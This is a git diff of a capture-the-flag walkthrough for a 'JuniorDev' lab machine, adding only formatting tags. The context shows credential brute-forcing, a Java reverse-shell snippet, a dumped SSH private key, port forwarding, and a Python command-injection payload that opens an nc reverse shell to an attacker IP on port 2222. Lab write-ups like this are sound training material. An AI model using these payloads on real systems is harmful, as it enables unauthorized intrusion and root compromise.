@@ -30,6 +30,7 @@ PORT      STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
+{: .nolineno}
 
 ## Web Enumeration ➡️
 
@@ -42,6 +43,7 @@ Now lets brute-force the credentails with username as admin and password I brute
 ```bash
 admin : matrix
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%203.png)
 
@@ -59,6 +61,7 @@ int port=4444;
 String cmd=”/bin/bash”;
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%204.png)
 
@@ -81,6 +84,7 @@ pwd
 /
 jenkins@dev1:/$
 ```
+{: .nolineno}
 
 Now I got the shell so lets go deep →
 
@@ -89,12 +93,14 @@ Got FLAGs on jenkins home directoy inside /users/ directory →
 ```bash
 FLAG69 :dffc1dc67f3d55d2b14227b73b590c4ed09b5113
 ```
+{: .nolineno}
 
 ```bash
 jenkins@dev1:~$ cat FLAG70.txt 
 41796ff9d0e29c02c961daa93454942d9c6bea7d
 jenkins@dev1:~$
 ```
+{: .nolineno}
 
 Now lets check the .bash_history file here →
 
@@ -117,6 +123,7 @@ ps aux | grep 8080
 exit
 jenkins@dev1:~$ 
 ```
+{: .nolineno}
 
 So I can `cat` the data inside the `id_rsa` file of `juniordev` user , so lets do it →
 
@@ -151,6 +158,7 @@ WtJNIy1nwgxLoJs9AAAADmp1bmlvcmRldkBkZXYxAQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 jenkins@dev1:~$
 ```
+{: .nolineno}
 
 Now lets log into `juniordev` user through ssh login with id_rsa file →
 
@@ -187,6 +195,7 @@ drwxr-xr-x 3 juniordev juniordev 4096 Apr 17 16:30 .local
 drwx-----x 2 juniordev juniordev 4096 Jun  8 16:15 .ssh
 juniordev@dev1:~$
 ```
+{: .nolineno}
 
 Now I seen the network configuration and I got to know about port 8080 running so for access that I need to perform `port forwarding` →
 
@@ -199,6 +208,7 @@ tcp           LISTEN         0              50                                 *
 tcp           LISTEN         0              128                             [::]:22                            [::]:*           
 juniordev@dev1:/tmp$
 ```
+{: .nolineno}
 
 On Attackers Machine I have to reset the ssh ->
 
@@ -211,6 +221,7 @@ Executing: /lib/systemd/systemd-sysv-install enable ssh
 ┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]
 └─$ sudo systemctl start ssh
 ```
+{: .nolineno}
 
 On Victim Machine  lets connect the Attackers machine to victim machine →
 
@@ -232,6 +243,7 @@ permitted by applicable law.
 ┌──(kali㉿kali)-[~]
 └─$
 ```
+{: .nolineno}
 
 I got this calculator page after loading this `localhost:8080` on web →
 
@@ -248,6 +260,7 @@ Lets see the flag →
 ```bash
 FLAG71 : d3c7c338d5d8370e5c61fd68e101237a4d438408
 ```
+{: .nolineno}
 
 while enumerating I also noticed that this service is running as root →
 
@@ -258,6 +271,7 @@ Now lets exploit this service through including python command injection exploit
 ```bash
 __import__("os").system('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.66.67.202+2222+>/tmp/f')
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%209.png)
 
